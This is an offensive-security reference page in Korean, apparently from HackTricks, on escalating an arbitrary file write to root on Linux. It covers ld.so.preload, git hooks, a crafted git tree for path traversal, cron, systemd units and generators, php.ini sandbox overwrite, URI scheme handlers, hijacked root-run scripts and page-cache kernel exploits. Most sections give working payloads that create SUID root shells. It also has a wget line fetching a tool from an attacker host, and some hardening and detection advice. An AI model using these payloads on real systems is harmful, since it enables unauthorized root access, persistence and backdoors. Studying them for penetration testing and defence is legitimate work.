# Root에 대한 임의 파일 쓰기

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload`은 dynamic linker가 다른 shared objects보다 먼저 로드하는 시스템 전체 shared objects 목록입니다. Secure-execution mode에서는 preloading에 추가 제한이 적용되므로 `/tmp/pe.so`와 같은 library path는 보편적인 SUID-binary 기법이 아닙니다.\
이를 생성하거나 수정할 수 있다면, 해당 파일을 로드하는 process는 다른 shared objects보다 먼저 목록에 지정된 library를 로드하므로 해당 process의 context에서 code execution이 가능합니다.<sup>[[12]](#references)</sup>

예: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks**는 commit 및 merge 작업을 포함해 repository에서 이벤트가 발생할 때 실행되는 executable script입니다. **privileged script 또는 user**가 해당 작업을 수행하고 attacker가 **`.git` folder에 write**할 수 있다면, hook을 **privilege escalation**에 사용할 수 있습니다.<sup>[[13]](#references)</sup>

예를 들어, 새로운 commit이 생성될 때마다 항상 실행되도록 git repo의 **`.git/hooks`**에 **script를 생성**할 수 있습니다:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Privileged Git tree export path traversal

권한 있는 synchronizer는 checkout을 수행하는 대신, `git ls-tree`로 attacker의 영향을 받는 repository를 열거하고, `git cat-file`로 각 blob을 읽은 뒤, 보고된 pathname을 staging directory에 결합하여 직접 기록할 수 있습니다. `-c safe.directory=*`를 사용해 Git의 소유자가 다른 repository에 대한 보호 기능을 비활성화하고 destination containment check도 수행하지 않으면, 이는 **synchronizer의 권한으로 임의 파일을 쓰는 문제**가 됩니다. 절대 경로인 tree-entry name은 Python의 `os.path.join(stage, name)`이 `stage`를 무시하게 만들며, `../`를 포함한 relative name은 filesystem이 이를 resolve할 때 경로 밖으로 벗어납니다. 애플리케이션이 Git에 checkout을 요청하는 대신 raw tree를 materialize하므로, checkout 시점의 pathname rejection은 이 sink를 보호하지 못합니다.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

root services, timers, deployment agents, template importers, backup/restore jobs에서 다음과 같은 code 형태를 찾으세요:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
`<mode> SP <name> NUL <raw object ID>` 형식으로 tree entry가 인코딩됩니다. `git hash-object --literally` 옵션은 일반적인 parsing이나 `git fsck`에서 거부될 수 있는 object data를 의도적으로 허용하므로, disposable clone에서 파일 이름이 absolute destination인 tree를 만들 수 있습니다. 이 예제는 cron-file blob을 생성하고, crafted tree를 commit으로 감싼 다음, branch를 해당 commit으로 이동합니다. 다만 exploitation을 위해서는 privileged job이 사용하는 repository를 업데이트할 권한과 malformed object를 허용하는 Git server가 모두 필요합니다.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening은 repository ingestion과 최종 filesystem operation을 모두 다뤄야 합니다:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*`를 service가 신뢰해야 하는 정확한 repository로 교체하고, 가능한 경우 root 권한 없이 repository processing을 실행합니다.
- materialization 전에 absolute name과 `.` 또는 `..` component를 거부합니다. join한 후 canonicalize하고 destination이 의도한 root 하위에 계속 위치하는지 검증합니다.
- check-then-open symlink race를 피합니다. 신뢰할 수 있는 directory descriptor를 기준으로 상대 경로를 열고, Linux에서는 attacker-controlled path에 `RESOLVE_BENEATH`와 `RESOLVE_NO_SYMLINKS`를 함께 사용하여 `openat2()`를 사용합니다.
- plumbing output에서 checkout을 재구현하기보다 격리된 directory에서 일반 checkout을 수행하는 방식을 우선합니다. raw-object ingestion이 필요한 경우 `receive.fsckObjects=true`와 같은 receive-side validation을 활성화하고, crafted tree를 거부하는 데 필요한 pathname 관련 `receive.fsck.*` findings의 수준을 낮추지 않습니다.

### Cron 및 Time files

**root가 실행하는 cron 관련 files를 write할 수 있다면**, 일반적으로 다음 job이 실행될 때 code execution을 얻을 수 있습니다. 흥미로운 targets에는 다음이 포함됩니다:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` 또는 `/var/spool/cron/crontabs/`에 있는 root 자신의 crontab
- `systemd` timers 및 해당 timers가 trigger하는 services

빠른 확인:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
일반적인 abuse 경로:

- `/etc/crontab` 또는 `/etc/cron.d/`의 파일에 **새 root cron job 추가**
- `run-parts`가 이미 실행하는 **script 교체**
- 실행되는 script 또는 binary를 수정하여 **기존 timer target에 backdoor 삽입**

최소 cron payload 예시:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts`가 사용하는 cron 디렉터리에만 쓸 수 있다면, 대신 그곳에 실행 가능한 파일을 넣습니다:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
참고:

- `run-parts`는 일반적으로 점이 포함된 파일 이름을 무시하므로 `backup.sh` 대신 `backup`과 같은 이름을 사용하는 것이 좋습니다.<sup>[[15]](#references)</sup>
- 일부 시스템은 기존 cron 대신 `systemd` timers를 사용하지만, abuse 아이디어는 동일합니다: **나중에 root가 실행할 내용을 수정**하는 것입니다.<sup>[[20]](#references)</sup>

### Service & Socket 파일

**`systemd` unit files** 또는 해당 파일에서 참조하는 파일에 write할 수 있다면, unit을 reload하고 restart하거나 service/socket activation 경로가 trigger될 때까지 기다려 root로 code execution을 얻을 수 있습니다.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interesting targets include:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf`의 Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`에서 참조하는 Service scripts/binaries
- root service가 load하는 writable `EnvironmentFile=` paths

빠른 확인:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
일반적인 악용 경로:

- 수정할 수 있는 root-owned service unit의 **`ExecStart=` 덮어쓰기**
- 악성 **`ExecStart=`**가 포함된 **drop-in override** 추가 및 먼저 기존 항목 삭제
- 해당 unit에서 이미 참조하는 **script/binary**에 **Backdoor** 삽입
- socket이 연결을 수신할 때 시작되는 해당 **`.service`** 파일을 수정하여 **socket-activated service** 가로채기

악성 override 예시:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
일반적인 활성화 흐름:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
서비스를 직접 재시작할 수 없지만 socket-activated unit을 편집할 수 있다면, root 권한으로 backdoored service의 실행을 트리거할 **client connection을 기다리기만** 하면 될 수 있습니다.<sup>[[17]](#references)</sup>

### systemd generator directories

**System generators**는 unit files를 로드하기 전에 system manager가 실행하는 executable이며, boot 중과 configuration reload 중 모두 실행됩니다. 따라서 system-generator directory 또는 기존 executable generator에 대한 write access는 직접적인 root-code-execution primitive이며, 감사 시 `*.service` 및 `*.timer` 파일만 확인하면 쉽게 놓칠 수 있습니다.<sup>[[35]](#references)[[36]](#references)</sup>

일반적인 search order는 `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, `/usr/lib/systemd/system-generators/`입니다(일부 distribution에서는 `/usr` merge를 통해 `/lib/systemd/system-generators/`를 노출합니다). 앞쪽 directory에 동일한 이름의 executable이 있으면 뒤쪽 executable을 shadow합니다. 이러한 **input executable directories**를 `/run/systemd/generator`, `/run/systemd/generator.early`, `/run/systemd/generator.late`와 혼동하지 마세요. 후자는 generators가 생성한 transient unit output을 포함합니다.<sup>[[35]](#references)</sup>

Quick checks:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
새로 생성한 generator에는 executable bit가 설정되어 있어야 한다. write primitive가 bytes는 제어하지만 mode는 제어하지 못한다면, 이미 executable인 generator를 대상으로 삼아라. 해당 파일을 제자리에서 truncate하면 일반적으로 metadata가 유지된다. directory 자체에 write 권한이 있다면 새 entry를 생성하고 executable로 표시하라.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
`systemctl daemon-reload`을 **system** manager에 대해 실행하려면 적절한 authorization이 필요하지만, 이 명령은 모든 system generator를 다시 실행합니다. 그렇지 않다면 권한이 있는 reload, package operation 또는 reboot를 기다려야 합니다. `~/.config/systemd/user-generators/`와 같은 user-generator 디렉터리는 user manager에서 실행되며, 그 자체만으로 root 권한을 제공하지 않습니다.<sup>[[35]](#references)</sup>

Hardening 및 hunting을 수행할 때는 최종 mode bits만 확인하지 말고 모든 path component와 ACL을 검증해야 하며, generator의 hash/package ownership을 baseline으로 설정하고 모든 system-generator input 디렉터리에서 create, rename, content 또는 permission 변경을 alert해야 합니다. one-shot generator는 실행 후 스스로 삭제할 수 있으므로 write를 monitoring하는 것이 중요하며, `/run/systemd/generator*` 아래의 generated unit tree는 다음 reload 시 다시 생성됩니다.<sup>[[35]](#references)[[36]](#references)</sup>

### 권한이 높은 PHP sandbox에서 사용하는 제한적인 `php.ini` 덮어쓰기

일부 custom daemon은 **restricted `php.ini`**를 사용하여 사용자 제공 PHP를 검증합니다(예: `disable_functions=exec,system,...`). sandbox된 code에 `file_put_contents`와 같은 **any write primitive**가 여전히 있고 daemon이 사용하는 **exact `php.ini` path**에 접근할 수 있다면, 해당 config를 **overwrite**하여 제한을 해제한 다음 elevated privileges로 실행되는 두 번째 payload를 제출할 수 있습니다.<sup>[[2]](#references)</sup>

일반적인 flow:

1. 첫 번째 payload가 sandbox config를 overwrite합니다.
2. dangerous functions가 다시 활성화된 상태에서 두 번째 payload가 code를 실행합니다.

최소 예제(daemon이 사용하는 path로 교체):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
데몬이 root로 실행되거나 root 소유 경로를 기준으로 검증한다면, 두 번째 실행은 root context를 생성합니다. 이는 sandboxed runtime이 여전히 파일을 쓸 수 있을 때 발생하는 **config overwrite를 통한 privilege escalation**입니다.

### binfmt_misc

`binfmt_misc`는 `/proc/sys/fs/binfmt_misc` 아래에 registration을 노출합니다. 각 registration은 file-type pattern을 interpreter와 연결합니다. privilege impact는 누가 registration을 변경할 수 있는지, 그리고 이후 어떤 process가 일치하는 파일을 실행하는지에 따라 달라지므로, 이를 privilege-escalation 경로로 간주하기 전에 해당 요구 사항을 확인해야 합니다.<sup>[[21]](#references)</sup>

### schema handlers 덮어쓰기 (http: 또는 https: 등)

Desktop environment는 URI scheme에 사용할 application을 선택하기 위해 MIME association과 desktop entry를 사용합니다. 관련 per-user configuration 및 desktop-entry directory에 쓸 수 있는 attacker는 해당 scheme을 자신이 제어하는 launcher로 redirect할 수 있습니다. `$HOME/.config/mimeapps.list` 파일을 수정하여 HTTP 및 HTTPS URL handler가 malicious file을 가리키도록 하면(예: `x-scheme-handler/http=evil.desktop` 및 `x-scheme-handler/https=evil.desktop`), 사용자의 click으로 해당 desktop entry가 실행될 수 있습니다.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root가 user-writable scripts/binaries를 실행하는 경우

권한이 있는 workflow에서 `/bin/sh /home/username/.../script`와 같은 명령을 실행하거나, 권한이 없는 사용자가 소유한 directory 내부의 binary를 실행한다면 이를 hijack할 수 있습니다:<sup>[[1]](#references)</sup>

- **실행 감지:** pspy로 process를 monitor하여 root가 user-controlled path를 호출하는지 확인합니다.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 대상 파일과 해당 디렉터리가 모두 사용자 소유이며 사용자가 쓸 수 있는지 확인합니다.
- **Hijack the target:** 원본 binary/script를 backup하고 SUID shell을 생성하는 payload(또는 기타 root action)를 배치한 다음, permissions를 복원합니다:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged action을 트리거**합니다(예: helper를 생성하는 UI 버튼 누르기). root가 hijacked path를 다시 실행하면 `./rootshell -p`로 escalated shell을 획득합니다.

### privileged binaries의 page-cache-only file modification

일부 kernel bug는 파일을 **디스크상에서** 수정하지 않습니다. 대신 읽을 수 있는 파일의 **page cache copy**만 수정하도록 허용합니다. **setuid** 또는 그 밖의 방식으로 **root가 실행하는** binary를 대상으로 삼을 수 있다면, 다음 실행 시 memory에서 attacker-controlled bytes가 실행되어 privilege를 상승시킬 수 있습니다. 이때 디스크의 file hash는 변경되지 않습니다.<sup>[[3]](#references)[[4]](#references)</sup>

이는 **runtime-only file write primitive**로 생각하면 유용합니다:<sup>[[3]](#references)</sup>

- **Disk는 깨끗한 상태로 유지됨**: inode와 디스크상의 bytes는 변경되지 않음
- **Memory는 dirty 상태가 됨**: cached page를 읽거나 실행하는 process는 attacker가 수정한 content를 가져감
- **효과는 일시적임**: reboot 또는 cache eviction 후 변경 사항이 사라짐

이 primitive는 고전적인 **arbitrary file write**와 Dirty COW / Dirty Pipe 같은 이전의 **page-cache abuse** bug 사이에 위치합니다:<sup>[[3]](#references)</sup>

- Dirty COW는 race에 의존함
- Dirty Pipe에는 write-position 제약이 있었음
- 취약한 path가 cached file-backed pages에 직접 write를 제공한다면 page-cache-only primitive가 더 안정적일 수 있음

#### 일반적인 privesc 흐름

1. **file-backed page cache pages**에 write할 수 있는 kernel primitive를 확보
2. 이를 **읽을 수 있는 privileged binary** 또는 root가 실행하는 다른 파일에 사용
3. page가 cache에서 eviction되기 **전에** execution을 트리거
4. 디스크상의 파일이 수정되지 않은 것처럼 보이는 상태에서 root로 code execution 획득

일반적인 고가치 target:

- **setuid-root** binaries
- **root services**가 실행하는 helpers
- **host kernel/page cache를 공유하는 containers**에서 일반적으로 실행되는 binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431)은 이 class의 좋은 example입니다. 취약한 path는 Linux crypto userspace API(`AF_ALG` / `algif_aead`)에 있었습니다:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`는 읽을 수 있는 파일의 page-cache pages에 대한 references를 crypto TX scatterlist로 이동할 수 있음
- in-place `algif_aead` decrypt path는 source와 destination buffers를 재사용함
- 이후 `authencesn`이 destination tag region에 write함
- 해당 region이 여전히 spliced file-backed pages를 참조하고 있으면 write가 **target file의 page cache**에 적용됨

따라서 흥미로운 technique은 CVE 자체가 아니라 다음과 같은 pattern입니다.

- **file-backed cache pages를 kernel subsystem에 전달**
- subsystem이 이를 **writable output으로 취급**하도록 만듦
- memory에서 작고 제어된 overwrite를 트리거

public PoC는 반복적인 **4-byte writes**를 사용해 memory상의 `/usr/bin/su`를 patch한 다음 이를 실행했습니다.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503)은 이번에는 sink가 `AF_ALG`가 아닌 **IPsec ESP decrypt**인, 동일한 **page-cache-only write-to-root** pattern의 또 다른 variant를 보여줍니다.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

중요한 technique은 **metadata-laundering 단계**입니다.

- `splice()`는 **read-only file-backed page-cache page**를 ESP-in-UDP packet에 배치함
- 기존 DirtyFrag mitigation은 해당 skb에 `SKBFL_SHARED_FRAG`를 tag하여 `esp_input()`이 decrypt 전에 **copy**하도록 함
- netfilter `TEE`는 `nf_dup_ipv4()` -> `__pskb_copy_fclone()`을 통해 packet을 duplicate함
- clone은 **동일한 physical page-cache reference**를 유지하지만 `SKBFL_SHARED_FRAG`는 잃음
- 이후 `esp_input()`은 clone을 안전한 것으로 간주하고 file-backed page에 대해 **in-place `cbc(aes)` decrypt**를 실행함

따라서 reviewer가 얻어야 할 broader lesson은 CVE보다 더 넓습니다. operation 전에 반드시 copy해야 하는지를 결정하는 데 **skb/page metadata**에 의존하는 mitigation이라면, backing page는 유지하면서 metadata를 제거하는 **clone/copy path**가 write primitive를 조용히 다시 열 수 있습니다.

일반적인 exploitation 흐름:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`를 사용해 **private network namespace 내부에서 `CAP_NET_ADMIN`**을 획득
2. loopback을 올리고 `mangle/OUTPUT`에 **netfilter `TEE` rule**을 설치
3. `NETLINK_XFRM`을 통해 **XFRM ESP transport SAs**를 설치
4. 각 target 4-byte word를 SA `seq_hi` field에 encode합니다(DirtyFrag의 word-selection trick)
5. spliced ESP-in-UDP packet을 전송하여 **TEE clone**이 `esp_input()`에 도달하고 **in place**로 decrypt하도록 함
6. `/usr/bin/su` 또는 다른 privileged executable의 page-cache copy가 attacker-controlled code를 포함할 때까지 반복

운영상의 impact는 `AF_ALG` example과 동일합니다. 디스크상의 파일은 깨끗한 상태로 유지되지만 `execve()`가 **mutated page-cache bytes**를 사용하여 root를 제공합니다.<sup>[[8]](#references)[[9]](#references)</sup>

이 variant에 유용한 exposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
단기적인 attack-surface 축소 역시 여기서는 경로별로 적용됩니다. `48f6a5356a33`을 포함한 kernel로 업그레이드하면 clone 경로가 수정되고, `xt_TEE` autoload를 차단하면 **flag-laundering 단계**가 제거되며, `esp4` / `esp6`를 차단하면 **decrypt sink**가 제거됩니다.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### 노출 및 hunting

이 유형의 bug가 의심된다면 디스크 무결성 검사에만 의존하지 마세요. 다음 항목도 확인하세요:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
아래 구성 값은 loadable interface와 kernel에 내장된 interface를 구분합니다. crypto build rules는 `CONFIG_CRYPTO_USER_API_AEAD`를 `algif_aead`에 매핑합니다.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`를 module로 load하거나 unload할 수 있습니다
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface가 kernel에 내장됩니다
- setuid binary는 page-cache-only patch만으로도 local foothold를 root로 전환하기에 좋은 target입니다

#### `algif_aead` 경로의 attack-surface reduction

취약한 interface가 loadable module로 제공되는 경우:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
커널에 컴파일된 경우, 일부 공개 사례에서는 다음과 같이 init 경로를 차단한다고 보고했습니다:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
이러한 종류의 완화 방법은 다른 kernel LPE에서도 기억해 둘 가치가 있습니다. exploitation이 특정 optional interface에 의존하는 경우, 전체 kernel upgrade를 적용할 수 있기 전이라도 해당 interface를 비활성화하거나 blacklist에 등록하면 exploit 경로를 차단할 수 있습니다.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – user-writable PaperCut 디렉터리에서 root가 실행하는 script hijacking](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431에 대한 Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place 방식으로 되돌리기](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE 변종 DirtyClone (CVE-2026-43503) 분석 및 exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()`에서 `SKBFL_SHARED_FRAG` 보존 (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: splice된 UDP packet에 `SKBFL_SHARED_FRAG` 설정 (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel 문서](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator documentation](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: persistence mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
